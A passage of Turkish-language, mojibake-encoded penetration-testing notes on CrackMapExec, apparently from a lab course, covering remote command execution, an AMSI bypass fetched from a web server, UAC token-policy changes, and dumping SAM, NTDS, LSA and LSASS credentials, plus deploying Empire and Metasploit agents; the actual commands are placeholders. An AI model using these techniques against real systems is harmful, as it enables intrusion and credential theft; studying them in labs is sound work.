EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

{{CODE_BLOCK_153}}


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_155}}


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

{{CODE_BLOCK_156}}


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

{{CODE_BLOCK_157}}

* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

{{CODE_BLOCK_158}}


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

{{CODE_BLOCK_166}}

EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

{{CODE_BLOCK_176}}

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_177}}

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### Ä°nceleme

{{CODE_BLOCK_179}}


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

{{CODE_BLOCK_180}}

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

